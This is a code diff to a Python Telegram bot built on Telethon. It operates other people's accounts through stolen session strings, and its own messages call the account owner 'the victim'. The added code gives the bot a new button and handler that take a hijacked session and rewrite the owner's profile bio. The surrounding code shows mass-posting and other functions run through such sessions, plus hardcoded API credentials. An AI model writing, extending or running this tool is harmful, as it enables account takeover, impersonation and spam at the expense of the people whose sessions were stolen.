@@ -147,7 +147,14 @@ async def userbans(strses, grp):
       except:
         pass
     
-
+async def change_bio(strses, new_bio):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            await X(UpdateProfileRequest(about=new_bio))
+            return True
+        except Exception as e:
+            print(e)
+            return False
 
 async def userchannels(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -220,6 +227,7 @@ keyboard = [
     Button.inline("L", data="L"),
     Button.inline("M", data="M"),
     Button.inline("N", data="N"),
+    Button.inline("X", data="X")
     ],
   [
     Button.url("༺ sourCe kαᖇαᖇ ༻", "https://t.me/aqhvv")
@@ -277,6 +285,7 @@ async def start(event):
             Button.inline("L", data="L"),
             Button.inline("M", data="M"),
             Button.inline("N", data="N"),
+            Button.inline("X", data="X")
             ],
           [
             Button.url("المـطور", "https://t.me/Lx5x5")
@@ -733,3 +742,21 @@ async def users(event):
       await x.send_message("الان سيتم ارسال الرساله بشكل تلقائي كل 10 دقائق")
       i = await gcastc(strses.text, msg.text)
       await event.reply(f" محادثات خاصة {i} تم النشر في  😉😉.", buttons=keyboard)
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"X")))
+async def users(event):
+    async with bot.conversation(event.chat_id) as x:
+        await x.send_message("الان ارسل الكود تيرمكس")
+        strses = await x.get_response()
+        op = await cu(strses.text)
+        if op:
+            pass
+        else:
+            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
+
+        await x.send_message("انطيني الكلام الي تريدة بالبايو")
+        new_bio_msg = await x.get_response()
+        new_bio_text = new_bio_msg.text
+        await change_bio(strses.text, new_bio_text) 
+        await event.reply(" غيرت البايو 🐍", buttons=keyboard)
+        
